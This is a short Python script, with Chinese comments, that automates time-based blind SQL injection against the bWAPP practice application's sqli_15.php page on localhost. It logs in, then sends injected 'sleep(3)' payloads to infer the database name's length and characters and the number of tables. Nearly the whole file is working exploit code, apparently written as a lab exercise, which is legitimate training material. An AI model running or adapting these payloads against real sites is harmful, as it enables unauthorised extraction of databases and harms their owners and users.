'''
bwapp sqli 时间盲注 将ip改为自己ip即可
'''
import requests
import time

ip_port = '127.0.0.1:80'
data = {
    'login' : 'aideyisu',
    'password' : 'aideyisu',
    'security_level' : '0',
    'form' : 'submit'
}

url_login = f'http://{ip_port}/login.php'
session = requests.session()
resp = session.post(url_login, data)
num = 0

base_url_start = f"http://{ip_port}/sqli_15.php?title=World War Z' and"
base_url_end = f"and sleep(3) -- &action=search"

# 获取数据库长度名称`
for i in range(1, 21) :
    url = f"{base_url_start} length(database())={i} {base_url_end}"
    start_time = time.time()
    resp =session.get(url)
    end_time = time.time()
    if  end_time - start_time > 1 :
        print(f'length of database name is {i} \n')
        num = i
        break

dbname= ''
# 获取数据库名字    
for j in range(1, num + 1) :
    for k in range(33, 128) :
        url = f"{base_url_start} ascii(substr(database(),{j},1))={k} {base_url_end}"
        start_time = time.time()
        resp =session.get(url)
        end_time = time.time()
        if  end_time - start_time > 1 :
            print(chr(k))
            dbname += chr(k)
            break
print('database name ' + dbname)

# 获取表长度
for i in range(1, 21) :
    url = f"{base_url_start} if((select count(*) from information_schema.tables where table_schema = '{dbname}')={i},1,0) {base_url_end}"
    start_time = time.time()
    resp =session.get(url)
    end_time = time.time()
    if  end_time - start_time > 1 :
        print(f'length of {dbname} name is {i} \n')
        num = i
        break

